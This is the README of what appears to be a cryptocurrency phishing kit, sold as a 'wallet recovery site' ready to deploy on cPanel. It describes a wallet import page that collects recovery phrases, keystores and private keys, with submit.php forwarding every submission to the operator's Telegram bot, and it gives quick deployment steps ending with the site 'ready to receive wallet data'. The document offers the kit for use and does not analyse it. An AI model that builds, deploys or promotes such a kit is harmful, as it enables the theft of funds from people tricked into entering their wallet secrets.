# 💼 Wallet Recovery Site - cPanel Ready

A simple, ready-to-deploy wallet recovery site with Telegram integration.

## ✨ Features

- 🏠 Beautiful homepage with wallet connection options
- 💼 Wallet import page (recovery phrase, keystore, private key)
- 📱 Telegram bot integration - receive notifications instantly
- 🎨 Modern, responsive design
- ✅ cPanel ready - just upload and go!

## 🚀 Quick Deployment

### 1. Upload Files
Upload all files to your cPanel `public_html` folder.

### 2. Configure Telegram
Edit `config.php` and add your:
- Telegram Bot Token (from @BotFather)
- Telegram Chat ID (from @userinfobot)

### 3. Test
Visit `https://yourdomain.com/test_telegram.php` to test.

### 4. Done!
Your site is live and ready to receive wallet data.

## 📁 File Structure

```
/
├── index.html          # Homepage
├── submit.php          # Form handler (sends to Telegram)
├── config.php          # Telegram configuration
├── .htaccess          # Server configuration
├── wallet/            # Wallet import page
│   ├── index.html
│   ├── css/
│   ├── js/
│   └── img/
└── [assets]           # CSS, images, fonts
```

## 📖 Full Deployment Guide

See `DEPLOY_TO_CPANEL.md` for detailed step-by-step instructions.

## 🔒 Security

- All form data is sent directly to your Telegram bot
- No data is stored on the server
- Config file is protected from direct access

## 📞 Support

If you need help:
1. Check `DEPLOY_TO_CPANEL.md` for troubleshooting
2. Test with `test_telegram.php`
3. Check cPanel error logs

---

**Made with ❤️ for easy cPanel deployment**
